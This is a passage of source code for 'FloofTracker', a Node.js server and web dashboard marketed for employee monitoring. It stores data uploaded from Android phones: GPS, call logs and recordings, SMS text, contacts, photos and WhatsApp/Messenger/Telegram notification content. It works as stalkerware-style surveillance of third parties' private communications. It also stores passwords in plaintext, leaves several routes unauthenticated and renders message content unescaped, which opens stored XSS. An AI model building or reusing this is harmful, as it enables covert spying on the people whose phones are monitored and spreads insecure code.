const express = require('express');
const mongoose = require('mongoose');
const crypto = require('crypto');

const app = express();
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

const PORT = process.env.PORT || 3000;
const MONGO_URI = process.env.MONGO_URI;

mongoose.connect(MONGO_URI)
    .then(() => console.log('MongoDB connected'))
    .catch(err => console.error('MongoDB error:', err));

// Schemas
const EmployerSchema = new mongoose.Schema({
    email: { type: String, unique: true },
    password: String,
    plan: { type: String, default: 'free' },
    created_at: { type: Date, default: Date.now }
});

const TokenSchema = new mongoose.Schema({
    token: { type: String, unique: true },
    employer_id: mongoose.Schema.Types.ObjectId,
    device_name: { type: String, default: '' },
    registered: { type: Boolean, default: false },
    created_at: { type: Date, default: Date.now },
    active: { type: Boolean, default: true }
});

const DeviceSchema = new mongoose.Schema({
    token: String,
    device_model: String,
    android_version: String,
    last_seen: Date
});

const GpsSchema = new mongoose.Schema({
    token: String,
    latitude: Number,
    longitude: Number,
    accuracy: Number,
    received_at: Date
});

const CallSchema = new mongoose.Schema({
    token: String,
    number: String,
    contact_name: String,
    call_type: String,
    duration_seconds: Number,
    called_at: Number
});

const SmsSchema = new mongoose.Schema({
    token: String,
    number: String,
    contact_name: String,
    message_body: String,
    sms_type: String,
    received_at: Number
});

const AppSchema = new mongoose.Schema({
    token: String,
    app_name: String,
    package_name: String,
    usage_seconds: Number,
    usage_date: String
});

const ContactSchema = new mongoose.Schema({
    token: String,
    name: String,
    number: String
});

const MediaSchema = new mongoose.Schema({
    token: String,
    filename: String,
    date_taken: Number,
    path: String,
    size_bytes: Number,
    is_screenshot: Boolean,
    thumbnail: String
});

const NotificationSchema = new mongoose.Schema({
    token: String,
    app: String,
    sender: String,
    chat_id: { type: String, default: '' },
    message: String,
    received_at: Date
});

const DownloadRequestSchema = new mongoose.Schema({
    token: String,
    filename: String,
    image_id: String,
    status: { type: String, default: 'pending' }, // pending, uploaded, downloaded
    full_image: String, // base64 full quality
    requested_at: { type: Date, default: Date.now }
});

const DownloadRequest = mongoose.model('DownloadRequest', DownloadRequestSchema);

const CallRecordingSchema = new mongoose.Schema({
    token: String,
    filename: String,
    audio_base64: String,
    recorded_at: Number,
    received_at: { type: Date, default: Date.now }
});
const CallRecording = mongoose.model('CallRecording', CallRecordingSchema)

const Employer = mongoose.model('Employer', EmployerSchema);
const Token = mongoose.model('Token', TokenSchema);
const Device = mongoose.model('Device', DeviceSchema);
const Gps = mongoose.model('Gps', GpsSchema);
const Call = mongoose.model('Call', CallSchema);
const Sms = mongoose.model('Sms', SmsSchema);
const App = mongoose.model('App', AppSchema);
const Contact = mongoose.model('Contact', ContactSchema);
const Media = mongoose.model('Media', MediaSchema);
const Notification = mongoose.model('Notification', NotificationSchema);
const Recording = mongoose.model("Recording", CallRecordingSchema);

const PLAN_LIMITS = { free: 1, starter: 5, business: 10, professional: 20, enterprise: 50 };

function getToken(req) {
    return req.headers['x-device-token'] || 'unknown';
}

const styles = `
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: Arial, sans-serif; background: #f0f2f5; }
    .header { background: #1a1a2e; color: white; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; }
    .header h1 { font-size: 20px; }
    .container { max-width: 1100px; margin: 30px auto; padding: 0 20px; }
    .card { background: white; border-radius: 12px; padding: 24px; margin-bottom: 20px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); }
    .btn { padding: 10px 20px; border: none; border-radius: 8px; cursor: pointer; font-size: 14px; }
    .btn-primary { background: #1a1a2e; color: white; }
    .btn-danger { background: #e74c3c; color: white; }
    .btn-success { background: #27ae60; color: white; }
    .btn-sm { padding: 6px 12px; font-size: 12px; }
    input { width: 100%; padding: 10px 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 14px; margin-bottom: 12px; }
    .msg { padding: 10px; border-radius: 8px; margin-bottom: 12px; font-size: 13px; }
    .msg-error { background: #fde; color: #c00; }
    .msg-success { background: #dfd; color: #060; }
    table { width: 100%; border-collapse: collapse; }
    th { background: #1a1a2e; color: white; padding: 10px; text-align: left; font-size: 13px; }
    td { padding: 8px 10px; border-bottom: 1px solid #eee; font-size: 13px; }
    tr:hover { background: #f9f9f9; }
    .token-card { background: #f8f8f8; border-radius: 8px; padding: 16px; margin-bottom: 12px; display: flex; justify-content: space-between; align-items: center; }
    .token-code { font-family: monospace; font-size: 12px; color: #555; word-break: break-all; }
    .badge { padding: 4px 10px; border-radius: 20px; font-size: 12px; }
    .badge-green { background: #dfd; color: #060; }
    .badge-gray { background: #eee; color: #666; }
    img.thumb { width: 80px; height: 80px; object-fit: cover; border-radius: 6px; }
    .plan-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 16px; }
    .plan-card { border: 2px solid #ddd; border-radius: 12px; padding: 20px; text-align: center; cursor: pointer; transition: all 0.2s; }
    .plan-card:hover { border-color: #1a1a2e; transform: translateY(-2px); }
    .plan-card h3 { margin-bottom: 8px; }
    .plan-card .price { font-size: 20px; font-weight: bold; color: #1a1a2e; margin: 8px 0; }
    .plan-card .devices { color: #666; font-size: 13px; margin-bottom: 12px; }
    .plan-card.popular { border-color: #1a1a2e; background: #f0f2ff; }
    .tabs { display: flex; gap: 4px; margin-bottom: 20px; flex-wrap: wrap; }
    .tab { padding: 10px 18px; border: none; border-radius: 8px; cursor: pointer; font-size: 14px; background: #eee; color: #555; transition: all 0.2s; }
    .tab.active { background: #1a1a2e; color: white; }
    .tab-content { display: none; }
    .tab-content.active { display: block; }
    .empty { text-align: center; color: #888; padding: 40px; }
    .no-data { color: #888; text-align: center; padding: 30px; }
`;

// ── Employer Routes ──────────────────────────────────────────────────────────

app.post('/employer/register', async (req, res) => {
    try {
        const { email, password } = req.body;
        const existing = await Employer.findOne({ email });
        if (existing) return res.json({ success: false, message: 'Email already exists' });
        const employer = await Employer.create({ email, password });
        res.json({ success: true, employer_id: employer._id });
    } catch (e) {
        res.json({ success: false, message: e.message });
    }
});

app.post('/employer/login', async (req, res) => {
    try {
        const { email, password } = req.body;
        const employer = await Employer.findOne({ email, password });
        if (!employer) return res.json({ success: false, message: 'Invalid credentials' });
        res.json({ success: true, employer_id: employer._id, plan: employer.plan });
    } catch (e) {
        res.json({ success: false, message: e.message });
    }
});

app.post('/employer/set-plan', async (req, res) => {
    try {
        const { employer_id, plan } = req.body;
        await Employer.findByIdAndUpdate(employer_id, { plan });
        res.json({ success: true });
    } catch (e) {
        res.json({ success: false, message: e.message });
    }
});

app.post('/employer/generate-token', async (req, res) => {
    try {
        const { employer_id } = req.body;
        const employer = await Employer.findById(employer_id);
        if (!employer) return res.json({ success: false, message: 'Employer not found' });
        const tokenCount = await Token.countDocuments({ employer_id, active: true });
        const limit = PLAN_LIMITS[employer.plan] || 1;
        if (tokenCount >= limit) {
            return res.json({ success: false, message: `Device limit reached for ${employer.plan} plan. Please upgrade.` });
        }
        const token = crypto.randomBytes(16).toString('hex');
        await Token.create({ token, employer_id });
        res.json({ success: true, token });
    } catch (e) {
        res.json({ success: false, message: e.message });
    }
});

app.post('/employer/tokens', async (req, res) => {
    try {
        const { employer_id } = req.body;
        const tokens = await Token.find({ employer_id, active: true });
        res.json({ success: true, tokens });
    } catch (e) {
        res.json({ success: false, message: e.message });
    }
});

app.post('/employer/delete-token', async (req, res) => {
    try {
        const { token_id } = req.body;
        await Token.findByIdAndUpdate(token_id, { active: false });
        res.json({ success: true });
    } catch (e) {
        res.json({ success: false, message: e.message });
    }
});

// ── Device Routes ────────────────────────────────────────────────────────────

app.post('/device/validate-token', async (req, res) => {
    try {
        const token = getToken(req);
        const valid = await Token.findOne({ token, active: true });
        if (!valid) return res.json({ success: false, message: 'Invalid token' });
        res.json({ success: true });
    } catch (e) {
        res.json({ success: false, message: e.message });
    }
});

app.post('/device/register', async (req, res) => {
    try {
        const token = getToken(req);
        await Device.findOneAndUpdate(
            { token },
            { token, ...req.body, last_seen: new Date() },
            { upsert: true }
        );
        await Token.findOneAndUpdate(
            { token },
            { registered: true, device_name: req.body.device_model }
        );
        console.log(`Device registered: ${token}`);
        res.json({ success: true });
    } catch (e) {
        res.json({ success: false, message: e.message });
    }
});

app.post('/device/gps', async (req, res) => {
    try {
        const token = getToken(req);
        await Gps.create({ token, ...req.body, received_at: new Date() });
        res.json({ success: true });
    } catch (e) {
        res.json({ success: false, message: e.message });
    }
});

app.post('/device/calls', async (req, res) => {
    try {
        const token = getToken(req);
        await Call.deleteMany({ token });
        await Call.insertMany(req.body.map(c => ({ token, ...c })));
        console.log(`${req.body.length} calls from ${token}`);
        res.json({ success: true });
    } catch (e) {
        res.json({ success: false, message: e.message });
    }
});

app.post('/device/sms', async (req, res) => {
    try {
        const token = getToken(req);
        const messages = req.body;
        
        for (const msg of messages) {
            const existing = await Sms.findOne({
                token,
                number: msg.number,
                received_at: msg.received_at
            });
            if (!existing) {
                await Sms.create({ token, ...msg });
            }
        }
        
        console.log(`${messages.length} SMS from ${token}`);
        res.json({ success: true });
    } catch (e) {
        res.json({ success: false, message: e.message });
    }
});

app.post('/device/apps', async (req, res) => {
    try {
        const token = getToken(req);
        await App.deleteMany({ token });
        await App.insertMany(req.body.map(a => ({ token, ...a })));
        console.log(`${req.body.length} apps from ${token}`);
        res.json({ success: true });
    } catch (e) {
        res.json({ success: false, message: e.message });
    }
});

app.post('/device/contacts', async (req, res) => {
    try {
        const token = getToken(req);
        await Contact.deleteMany({ token });
        await Contact.insertMany(req.body.map(c => ({ token, ...c })));
        console.log(`${req.body.length} contacts from ${token}`);
        res.json({ success: true });
    } catch (e) {
        res.json({ success: false, message: e.message });
    }
});

app.post('/device/media', async (req, res) => {
    try {
        const token = getToken(req);
        console.log(`Media received from token: ${token}, count: ${req.body.length}`);
        const deleted = await Media.deleteMany({ token });
        console.log(`Deleted ${deleted.deletedCount} old media records`);
        await Media.insertMany(req.body.map(m => ({ token, ...m })));
        res.json({ success: true });
    } catch (e) {
        console.error('Media error:', e.message);
        res.json({ success: false, message: e.message });
    }
});

app.post('/device/notifications', async (req, res) => {
    try {
        const token = getToken(req);
        await Notification.create({ token, ...req.body, received_at: new Date() });
        console.log(`Notification from ${token}`);
        res.json({ success: true });
    } catch (e) {
        res.json({ success: false, message: e.message });
    }
});

app.post('/device/call-recording', async (req, res) => {
    try {
        const token = getToken(req);
        await CallRecording.create({ token, ...req.body });
        console.log(`Call recording received from ${token}: ${req.body.filename}`);
        res.json({ success: true });
    } catch (e) {
        res.json({ success: false, message: e.message });
    }
});

// ── Frontend Pages ───────────────────────────────────────────────────────────

app.get('/', (req, res) => {
    res.send(`<!DOCTYPE html><html><head><title>FloofTracker</title><style>
    ${styles}
    .login-wrap { display:flex; justify-content:center; align-items:center; min-height:100vh; }
    .login-box { background:white; border-radius:16px; padding:40px; width:380px; box-shadow:0 4px 20px rgba(0,0,0,0.1); }
    .login-box h2 { margin-bottom:6px; color:#1a1a2e; }
    .login-box p { color:#888; margin-bottom:24px; font-size:14px; }
    .btn { width:100%; padding:12px; font-size:15px; }
    a { display:block; text-align:center; margin-top:16px; color:#666; font-size:13px; text-decoration:none; }
    </style></head><body>
    <div class="login-wrap">
        <div class="login-box">
            <h2>FloofTracker</h2>
            <p>Employee monitoring made simple</p>
            <div class="msg msg-error" id="msg" style="display:none"></div>
            <input type="email" id="email" placeholder="Email address"/>
            <input type="password" id="password" placeholder="Password"/>
            <button class="btn btn-primary" onclick="login()">Login</button>
            <a href="/register">Don't have an account? Register here</a>
        </div>
    </div>
    <script>
        async function login() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const res = await fetch('/employer/login', {
                method:'POST', headers:{'Content-Type':'application/json'},
                body: JSON.stringify({ email, password })
            });
            const data = await res.json();
            if (data.success) {
                localStorage.setItem('employer_id', data.employer_id);
                localStorage.setItem('plan', data.plan);
                window.location.href = data.plan === 'free' ? '/welcome' : '/tokens';
            } else {
                const msg = document.getElementById('msg');
                msg.style.display = 'block';
                msg.textContent = data.message;
            }
        }
    </script>
    </body></html>`);
});

app.get('/register', (req, res) => {
    res.send(`<!DOCTYPE html><html><head><title>Register - FloofTracker</title><style>
    ${styles}
    .login-wrap { display:flex; justify-content:center; align-items:center; min-height:100vh; }
    .login-box { background:white; border-radius:16px; padding:40px; width:380px; box-shadow:0 4px 20px rgba(0,0,0,0.1); }
    .login-box h2 { margin-bottom:6px; color:#1a1a2e; }
    .login-box p { color:#888; margin-bottom:24px; font-size:14px; }
    .btn { width:100%; padding:12px; font-size:15px; }
    a { display:block; text-align:center; margin-top:16px; color:#666; font-size:13px; text-decoration:none; }
    </style></head><body>
    <div class="login-wrap">
        <div class="login-box">
            <h2>Create Account</h2>
            <p>Start monitoring your team today</p>
            <div class="msg msg-error" id="msg" style="display:none"></div>
            <input type="email" id="email" placeholder="Email address"/>
            <input type="password" id="password" placeholder="Password"/>
            <input type="password" id="confirm" placeholder="Confirm password"/>
            <button class="btn btn-primary" onclick="register()">Create Account</button>
            <a href="/">Already have an account? Login</a>
        </div>
    </div>
    <script>
        async function register() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const confirm = document.getElementById('confirm').value;
            const msg = document.getElementById('msg');
            if (password !== confirm) { msg.style.display='block'; msg.textContent='Passwords do not match'; return; }
            const res = await fetch('/employer/register', {
                method:'POST', headers:{'Content-Type':'application/json'},
                body: JSON.stringify({ email, password })
            });
            const data = await res.json();
            if (data.success) {
                localStorage.setItem('employer_id', data.employer_id);
                localStorage.setItem('plan', 'free');
                window.location.href = '/welcome';
            } else {
                msg.style.display='block'; msg.textContent=data.message;
            }
        }
    </script>
    </body></html>`);
});

app.get('/welcome', (req, res) => {
    res.send(`<!DOCTYPE html><html><head><title>Welcome - FloofTracker</title><style>
    ${styles}
    .feature-grid { display:grid; grid-template-columns:repeat(auto-fit, minmax(180px,1fr)); gap:16px; margin:20px 0; }
    .feature-item { background:#f8f8f8; border-radius:10px; padding:20px; text-align:center; }
    .feature-item .icon { font-size:32px; margin-bottom:10px; }
    .feature-item h4 { color:#1a1a2e; margin-bottom:6px; }
    .feature-item p { color:#888; font-size:13px; }
    </style></head><body>
    <div class="header"><h1>FloofTracker</h1><button class="btn btn-danger" onclick="logout()">Logout</button></div>
    <div class="container">
        <div class="card" style="text-align:center;padding:40px">
            <h2 style="color:#1a1a2e;margin-bottom:10px">Welcome to FloofTracker 👋</h2>
            <p style="color:#888;margin-bottom:30px">Here's what you can monitor on your employees' devices</p>
            <div class="feature-grid">
                <div class="feature-item"><div class="icon">📍</div><h4>GPS Location</h4><p>Real-time location tracking every 5 minutes</p></div>
                <div class="feature-item"><div class="icon">📞</div><h4>Call Logs</h4><p>Incoming, outgoing and missed calls with duration</p></div>
                <div class="feature-item"><div class="icon">💬</div><h4>SMS Messages</h4><p>All sent and received text messages</p></div>
                <div class="feature-item"><div class="icon">📱</div><h4>App Usage</h4><p>Which apps are used and for how long</p></div>
                <div class="feature-item"><div class="icon">👥</div><h4>Contacts</h4><p>Full contact list with names and numbers</p></div>
                <div class="feature-item"><div class="icon">🖼️</div><h4>Photos & Screenshots</h4><p>Thumbnail previews of all captured media</p></div>
                <div class="feature-item"><div class="icon">🔔</div><h4>Instant Messages</h4><p>Facebook, Instagram, WhatsApp, Viber and more</p></div>
            </div>
            <button class="btn btn-primary" onclick="window.location.href='/plans'" style="margin-top:30px;padding:14px 40px;font-size:15px">Choose a Plan →</button>
        </div>
    </div>
    <script>
        if (!localStorage.getItem('employer_id')) window.location.href = '/';
        function logout() { localStorage.clear(); window.location.href = '/'; }
    </script>
    </body></html>`);
});

app.get('/plans', (req, res) => {
    res.send(`<!DOCTYPE html><html><head><title>Plans - FloofTracker</title><style>
    ${styles}
    .btn { padding:12px 24px; font-size:14px; width:100%; margin-top:12px; }
    </style></head><body>
    <div class="header"><h1>FloofTracker</h1><button class="btn btn-danger" onclick="logout()" style="width:auto">Logout</button></div>
    <div class="container">
        <div class="card">
            <h2 style="color:#1a1a2e;margin-bottom:6px">Choose Your Plan</h2>
            <p style="color:#888;margin-bottom:24px">All plans include all features. Upgrade anytime.</p>
            <div class="plan-grid">
                <div class="plan-card" onclick="selectPlan('free')">
                    <h3>Free</h3>
                    <div class="price">₱0</div>
                    <div class="devices">1 device</div>
                    <button class="btn btn-primary">Select</button>
                </div>
                <div class="plan-card" onclick="selectPlan('starter')">
                    <h3>Starter</h3>
                    <div class="price">Coming Soon</div>
                    <div class="devices">5 devices</div>
                    <button class="btn btn-primary">Select</button>
                </div>
                <div class="plan-card popular" onclick="selectPlan('business')">
                    <h3>Business ⭐</h3>
                    <div class="price">Coming Soon</div>
                    <div class="devices">10 devices</div>
                    <button class="btn btn-primary">Select</button>
                </div>
                <div class="plan-card" onclick="selectPlan('professional')">
                    <h3>Professional</h3>
                    <div class="price">Coming Soon</div>
                    <div class="devices">20 devices</div>
                    <button class="btn btn-primary">Select</button>
                </div>
                <div class="plan-card" onclick="selectPlan('enterprise')">
                    <h3>Enterprise</h3>
                    <div class="price">Coming Soon</div>
                    <div class="devices">Unlimited</div>
                    <button class="btn btn-primary">Select</button>
                </div>
            </div>
        </div>
    </div>
    <script>
        if (!localStorage.getItem('employer_id')) window.location.href = '/';
        function logout() { localStorage.clear(); window.location.href = '/'; }
        async function selectPlan(plan) {
            const employer_id = localStorage.getItem('employer_id');
            await fetch('/employer/set-plan', {
                method:'POST', headers:{'Content-Type':'application/json'},
                body: JSON.stringify({ employer_id, plan })
            });
            localStorage.setItem('plan', plan);
            window.location.href = '/tokens';
        }
    </script>
    </body></html>`);
});

app.get('/tokens', (req, res) => {
    res.send(`<!DOCTYPE html><html><head><title>Devices - FloofTracker</title><style>
    ${styles}
    .top-bar { display:flex; justify-content:space-between; align-items:center; margin-bottom:20px; }
    </style></head><body>
    <div class="header"><h1>FloofTracker</h1>
        <div style="display:flex;gap:8px">
            <button class="btn btn-primary" onclick="window.location.href='/plans'">Change Plan</button>
            <button class="btn btn-danger" onclick="logout()">Logout</button>
        </div>
    </div>
    <div class="container">
        <div class="card">
            <div class="top-bar">
                <div>
                    <h2 style="color:#1a1a2e">Your Devices</h2>
                    <p style="color:#888;font-size:13px;margin-top:4px">Plan: <b id="plan_label"></b> &nbsp;·&nbsp; <span id="device_count"></span></p>
                </div>
                <button class="btn btn-success" onclick="generateToken()">+ Add Device</button>
            </div>
            <div class="msg msg-error" id="msg" style="display:none"></div>
            <div id="tokens_list"></div>
        </div>
    </div>
    <script>
        if (!localStorage.getItem('employer_id')) window.location.href = '/';
        const employer_id = localStorage.getItem('employer_id');
        const plan = localStorage.getItem('plan') || 'free';
        const limits = { free:1, starter:5, business:10, professional:20, enterprise:'Unlimited' };
        document.getElementById('plan_label').textContent = plan.charAt(0).toUpperCase() + plan.slice(1);

        async function loadTokens() {
            const res = await fetch('/employer/tokens', {
                method:'POST', headers:{'Content-Type':'application/json'},
                body: JSON.stringify({ employer_id })
            });
            const data = await res.json();
            const list = document.getElementById('tokens_list');
            const limit = limits[plan];
            document.getElementById('device_count').textContent = data.tokens.length + ' / ' + limit + ' devices';

            if (data.tokens.length === 0) {
                list.innerHTML = '<p class="empty">No devices yet. Click "+ Add Device" to generate a token.</p>';
                return;
            }

            list.innerHTML = data.tokens.map(t => \`
                <div class="token-card">
                    <div style="flex:1;min-width:0;margin-right:12px">
                        <div style="font-weight:bold;margin-bottom:4px">
                            \${t.registered ? '📱 ' + t.device_name : '⏳ Awaiting registration'}
                        </div>
                        <div class="token-code">\${t.token}</div>
                        <span class="badge \${t.registered ? 'badge-green' : 'badge-gray'}" style="margin-top:6px;display:inline-block">
                            \${t.registered ? 'Active' : 'Not registered'}
                        </span>
                    </div>
                    <div style="display:flex;gap:8px;flex-shrink:0">
                        <button class="btn btn-sm" onclick="copyToken('\${t.token}')" style="background:#eee;color:#333">Copy</button>
                        \${t.registered ? \`<button class="btn btn-sm btn-primary" onclick="viewDevice('\${t.token}')">View</button>\` : ''}
                        <button class="btn btn-sm btn-danger" onclick="deleteToken('\${t._id}')">Remove</button>
                    </div>
                </div>
            \`).join('');
        }

        async function generateToken() {
            const res = await fetch('/employer/generate-token', {
                method:'POST', headers:{'Content-Type':'application/json'},
                body: JSON.stringify({ employer_id })
            });
            const data = await res.json();
            const msg = document.getElementById('msg');
            if (data.success) { msg.style.display='none'; loadTokens(); }
            else { msg.style.display='block'; msg.textContent=data.message; }
        }

        async function deleteToken(token_id) {
            if (!confirm('Remove this device?')) return;
            await fetch('/employer/delete-token', {
                method:'POST', headers:{'Content-Type':'application/json'},
                body: JSON.stringify({ token_id })
            });
            loadTokens();
        }

        function copyToken(token) {
            navigator.clipboard.writeText(token);
            alert('Token copied: ' + token);
        }

        function viewDevice(token) { window.location.href = '/device?token=' + token; }
        function logout() { localStorage.clear(); window.location.href = '/'; }

        loadTokens();
    </script>
    </body></html>`);
});

// Per-device dashboard with tabs
app.get('/device', async (req, res) => {
    const token = req.query.token;
    if (!token) return res.redirect('/tokens');

    const device = await Device.findOne({ token });
    const gps = await Gps.find({ token }).sort({ received_at: -1 }).limit(50);
    const calls = await Call.find({ token }).sort({ called_at: -1 });
    const recordings = await CallRecording.find({ token }).sort({ recorded_at: -1 });
    const sms = await Sms.find({ token }).sort({ received_at: -1 });
    const apps = await App.find({ token }).sort({ usage_seconds: -1 });
    const contacts = await Contact.find({ token });
    const media = await Media.find({ token }).sort({ date_taken: -1 });
    const notifications = await Notification.find({ token }).sort({ received_at: -1 }).limit(200);

    res.send(`<!DOCTYPE html><html><head>
    <title>${device?.device_model || 'Device'} - FloofTracker</title>
    <meta http-equiv="refresh" content="30">
    <style>${styles}</style>
    </head><body>
    <div class="header">
        <div>
            <h1>📱 ${device?.device_model || 'Device'}</h1>
            <small style="color:#aaa">Android ${device?.android_version || ''} &nbsp;·&nbsp; Last seen: ${device?.last_seen ? new Date(device.last_seen).toLocaleString() : 'Never'}</small>
        </div>
        <div style="display:flex;gap:8px">
            <button class="btn btn-primary" onclick="window.location.href='/tokens'">← Back</button>
            <button class="btn btn-danger" onclick="logout()">Logout</button>
        </div>
    </div>
    <div class="container">
        <div class="tabs">
       <button class="tab active" onclick="showTab('apps', this)">📱 Apps</button>
<button class="tab" onclick="showTab('calls', this)">📞 Calls</button>
<button class="tab" onclick="showTab('sms', this)">💬 SMS</button>
<button class="tab" onclick="showTab('gps', this)">📍 GPS</button>
<button class="tab" onclick="showTab('contacts', this)">👥 Contacts</button>
<button class="tab" onclick="showTab('media', this)">🖼️ Media</button>
<button class="tab" onclick="showTab('messages', this)">🔔 Messages</button>
        </div>

        <!-- Apps Tab -->
        <div id="tab-apps" class="tab-content active">
            <div class="card" style="padding:0">
                ${apps.length === 0 ? '<p class="no-data">No app usage data</p>' : `
                <table>
                    <tr><th>App</th><th>Usage</th><th>Date</th></tr>
                    ${apps.map(a => `<tr><td>${a.app_name}</td><td>${Math.round(a.usage_seconds / 60)} min</td><td>${a.usage_date}</td></tr>`).join('')}
                </table>`}
            </div>
        </div>

       <!-- Calls Tab -->
<div id="tab-calls" class="tab-content">
    <div class="card" style="padding:0">
        ${calls.length === 0 ? '<p class="no-data">No call logs</p>' : `
        <table>
            <tr><th>Number</th><th>Name</th><th>Type</th><th>Duration</th><th>Date</th><th>Recording</th></tr>
            ${calls.map(c => {
                // Match recording within 60 seconds of call
                const recording = recordings.find(r => 
                    Math.abs(r.recorded_at - c.called_at) < 60000
                );
                return `<tr>
                    <td>${c.number}</td>
                    <td>${c.contact_name || '-'}</td>
                    <td>${c.call_type}</td>
                    <td>${c.duration_seconds}s</td>
                    <td>${new Date(c.called_at).toLocaleString()}</td>
                    <td>${recording ? 
                        `<audio controls src="data:audio/mp4;base64,${recording.audio_base64}" style="height:32px;width:200px"></audio>` : 
                        '<span style="color:#888;font-size:12px">No recording</span>'
                    }</td>
                </tr>`;
            }).join('')}
        </table>`}
    </div>
</div>

        <!-- SMS Tab -->
        <div id="tab-sms" class="tab-content">
            <div class="card" style="padding:0">
                ${sms.length === 0 ? '<p class="no-data">No SMS messages</p>' : `
                <table>
                    <tr><th>Number</th><th>Type</th><th>Message</th><th>Date</th></tr>
                    ${sms.map(s => `<tr>
                        <td>${s.number}</td>
                        <td>${s.sms_type}</td>
                        <td>${s.message_body}</td>
                        <td>${new Date(s.received_at).toLocaleString()}</td>
                    </tr>`).join('')}
                </table>`}
            </div>
        </div>

        <!-- GPS Tab -->
        <div id="tab-gps" class="tab-content">
            <div class="card" style="padding:0">
                ${gps.length === 0 ? '<p class="no-data">No GPS data yet</p>' : `
                <table>
                    <tr><th>Latitude</th><th>Longitude</th><th>Accuracy</th><th>Map</th><th>Date</th></tr>
                    ${gps.map(g => `<tr>
                        <td>${g.latitude}</td>
                        <td>${g.longitude}</td>
                        <td>${g.accuracy}m</td>
                        <td><a href="https://maps.google.com/?q=${g.latitude},${g.longitude}" target="_blank">View</a></td>
                        <td>${new Date(g.received_at).toLocaleString()}</td>
                    </tr>`).join('')}
                </table>`}
            </div>
        </div>

        <!-- Contacts Tab -->
        <div id="tab-contacts" class="tab-content">
            <div class="card" style="padding:0">
                ${contacts.length === 0 ? '<p class="no-data">No contacts</p>' : `
                <table>
                    <tr><th>Name</th><th>Number</th></tr>
                    ${contacts.map(c => `<tr><td>${c.name}</td><td>${c.number}</td></tr>`).join('')}
                </table>`}
            </div>
        </div>

     <!-- Media Tab -->
<div id="tab-media" class="tab-content">
    <div class="card" style="padding:0">
        ${media.length === 0 ? '<p class="no-data">No media files</p>' : `
        <table>
            <tr><th>Preview</th><th>Filename</th><th>Type</th><th>Actual Size</th><th>Date</th><th>Action</th></tr>
          ${media.map(m => `<tr>
    <td>${m.thumbnail ? `<img class="thumb" src="data:image/jpeg;base64,${m.thumbnail}" style="cursor:pointer" data-src="data:image/jpeg;base64,${m.thumbnail}" onclick="openLightbox(this)"/>` : 'No preview'}</td>
    <td>${m.filename}</td>
    <td>${m.is_screenshot ? '📸 Screenshot' : '🖼️ Photo'}</td>
    <td>${Math.round(m.size_bytes / 1024)}KB</td>
    <td>${new Date(m.date_taken).toLocaleString()}</td>
    <td><button class="btn btn-sm btn-primary" onclick="requestDownload('${token}','${m.filename}','${m._id}')">Download Full</button></td>
</tr>`).join('')}
        </table>`}
    </div>
</div>

<!-- Lightbox -->
<div id="lightbox" onclick="closeLightbox()" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:9999;justify-content:center;align-items:center;cursor:pointer">
    <img id="lightbox-img" style="max-width:90%;max-height:90%;border-radius:8px;"/>
</div>

      <!-- Messages Tab -->
<div id="tab-messages" class="tab-content">
    <div class="card">
        <!-- Level 1: App selector -->
        <div id="msg-level-apps">
    <h3 style="margin-bottom:16px;color:#1a1a2e">Messaging Apps</h3>
    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px">
        ${['Messenger','WhatsApp','Telegram'].map(function(app) {
            const count = notifications.filter(function(n) { return n.app === app; }).length;
            const icon = app === 'Messenger' ? '💬' : app === 'WhatsApp' ? '📱' : '✈️';
            return '<div onclick="showChats(\'' + app + '\')" style="background:#f8f8f8;border-radius:10px;padding:20px;text-align:center;cursor:pointer;border:2px solid #eee" '
                + 'onmouseover="this.style.borderColor=\'#1a1a2e\'" onmouseout="this.style.borderColor=\'#eee\'">'
                + '<div style="font-size:28px;margin-bottom:8px">' + icon + '</div>'
                + '<div style="font-weight:bold;color:#1a1a2e">' + app + '</div>'
                + '<div style="color:#888;font-size:12px;margin-top:4px">' + count + ' messages</div>'
                + '</div>';
        }).join('')}
    </div>
</div>

        <!-- Level 2: Chats list -->
        <div id="msg-level-chats" style="display:none">
            <div style="display:flex;align-items:center;margin-bottom:16px">
                <button class="btn" onclick="showApps()" style="background:#eee;color:#333;margin-right:12px">← Back</button>
                <h3 id="chats-title" style="color:#1a1a2e"></h3>
            </div>
            <div id="chats-list"></div>
        </div>

        <!-- Level 3: Chat messages -->
        <div id="msg-level-messages" style="display:none">
            <div style="display:flex;align-items:center;margin-bottom:16px">
                <button class="btn" onclick="showChatsBack()" style="background:#eee;color:#333;margin-right:12px">← Back</button>
                <h3 id="messages-title" style="color:#1a1a2e"></h3>
            </div>
            <div id="messages-list"></div>
        </div>
    </div>
</div>

    </div>
    <script>
        if (!localStorage.getItem('employer_id')) window.location.href = '/';
        function logout() { localStorage.clear(); window.location.href = '/'; }

function openLightbox(img) {
    document.getElementById('lightbox-img').src = img.dataset.src;
    document.getElementById('lightbox').style.display = 'flex';
}
function closeLightbox() {
    document.getElementById('lightbox').style.display = 'none';
}

function showTab(name, el) {
    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.getElementById('tab-' + name).classList.add('active');
    el.classList.add('active');
}

// Messages navigation
let allNotifications = [];

// Fetch notifications via API
fetch('/device/notifications-data?token=${token}')
    .then(r => r.json())
    .then(data => { allNotifications = data.notifications || []; });
let currentApp = '';

function showApps() {
    document.getElementById('msg-level-apps').style.display = 'block';
    document.getElementById('msg-level-chats').style.display = 'none';
    document.getElementById('msg-level-messages').style.display = 'none';
}

function showChats(app) {
    currentApp = app;
    document.getElementById('msg-level-apps').style.display = 'none';
    document.getElementById('msg-level-chats').style.display = 'block';
    document.getElementById('msg-level-messages').style.display = 'none';
    document.getElementById('chats-title').textContent = app + ' - Chats';

    const appMessages = allNotifications.filter(n => n.app === app);
    const senders = [...new Set(appMessages.map(n => n.sender))];

    const list = document.getElementById('chats-list');
    if (senders.length === 0) {
        list.innerHTML = '<p class="no-data">No chats found</p>';
        return;
    }

    list.innerHTML = senders.map(function(sender) {
